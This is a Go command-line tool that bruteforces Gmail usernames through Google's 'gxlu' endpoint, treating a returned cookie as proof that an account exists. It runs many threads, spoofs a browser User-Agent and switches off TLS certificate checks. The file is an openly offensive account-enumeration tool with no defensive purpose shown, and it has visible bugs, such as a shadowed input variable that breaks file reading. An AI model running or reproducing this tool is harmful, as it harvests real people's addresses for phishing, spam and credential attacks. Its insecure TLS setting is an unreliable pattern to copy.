package main

import (
	"bufio"
	"crypto/tls"
	"flag"
	"fmt"
	"net"
	"net/http"
	"net/url"
	"os"
	"strings"
	"sync"
	"time"
)

type Result struct {
	Found   bool
	Address string
}

var (
	inputFile  string
	outputFile string
	domain     string
	stdin      bool
	threads    int
	client     *http.Client
	headers    map[string]string
)

func init() {
	flag.StringVar(&inputFile, "i", "", "List of accounts to test")
	flag.StringVar(&outputFile, "o", "", "Output file (default: Stdout)")
	flag.StringVar(&domain, "d", "gmail.com", "Append domain to every address (empty to no append)")
	flag.BoolVar(&stdin, "stdin", false, "Read accounts from stdin")
	flag.IntVar(&threads, "t", 10, "Number of threads")
	flag.Parse()

	if inputFile == "" && !stdin {
		flag.Usage()
		os.Exit(1)
	}

	client = &http.Client{
		Transport: &http.Transport{
			Proxy: http.ProxyFromEnvironment,
			DialContext: (&net.Dialer{
				Timeout:   30 * time.Second,
				KeepAlive: 30 * time.Second,
				DualStack: true,
			}).DialContext,
			// MaxIdleConns:          100,
			IdleConnTimeout:       90 * time.Second,
			TLSHandshakeTimeout:   10 * time.Second,
			ExpectContinueTimeout: 1 * time.Second,
			DisableKeepAlives:     true,
			TLSClientConfig:       &tls.Config{InsecureSkipVerify: true},
		},
	}

	headers = map[string]string{
		"User-Agent":      `Mozilla/5.0 (Windows NT 6.1; rv:61.0) Gecko/20100101 Firefox/61.0`,
		"Accept-Language": `en-US,en;q=0.5`,
	}
}

// TestAddress checks if a given address is valid using the glitch described here: https://blog.0day.rocks/abusing-gmail-to-get-previously-unlisted-e-mail-addresses-41544b62b2
func TestAddress(addr string, resChan chan<- Result) {
	URL := fmt.Sprintf("https://mail.google.com/mail/gxlu?email=%s", url.QueryEscape(addr))
	req, err := http.NewRequest(http.MethodGet, URL, nil)
	if err != nil {
		return
	}

	// Add headers
	for key, val := range headers {
		req.Header.Set(key, val)
	}

	// Make request
	resp, err := client.Do(req)
	if err != nil {
		return
	}
	resp.Body.Close()

	found := len(resp.Cookies()) > 0
	resChan <- Result{found, addr}
}

func main() {

	addrChan := make(chan string, threads)
	resultsChan := make(chan Result)

	// Group to wait for all threads (routines) to finish
	threadsG := new(sync.WaitGroup)

	var input *os.File
	if stdin {
		input = os.Stdin
		inputFile = "stdin"
	} else {
		input, err := os.Open(inputFile)
		if err != nil {
			fmt.Printf("[!] Error opening file '%s'\n", inputFile)
			return
		}
		defer input.Close()
	}

	out, err := os.OpenFile(outputFile, os.O_APPEND|os.O_CREATE, os.ModeAppend)
	if err != nil {
		out = os.Stdout
	}
	defer out.Close()

	// TODO: Put some fancy ascii art here??
	fmt.Println("--- Starting bruteforce --")
	fmt.Printf("| Input:   %s\n", inputFile)
	fmt.Printf("| Threads: %d\n\n", threads)

	// Start all threads (routines)
	for i := 0; i < threads; i++ {
		go func() {
			for addr := range addrChan {
				if addr == "" {
					break
				}

				// Append domain to address
				if domain != "" {
					addr += "@" + domain
				}

				TestAddress(addr, resultsChan)
			}
			threadsG.Done()
		}()
		threadsG.Add(1)
	}

	scanner := bufio.NewScanner(input)
	scanner.Split(bufio.ScanLines)

	go func() {
		for scanner.Scan() {
			addr := strings.TrimSpace(scanner.Text())
			// Skip comments and empty lines
			if !strings.HasPrefix(addr, "#") && addr != "" {
				addrChan <- addr
			}
		}

		close(addrChan)
		threadsG.Wait()
		close(resultsChan)
	}()

	for result := range resultsChan {
		if result.Found {
			fmt.Fprintln(out, result.Address)
		}
	}

}
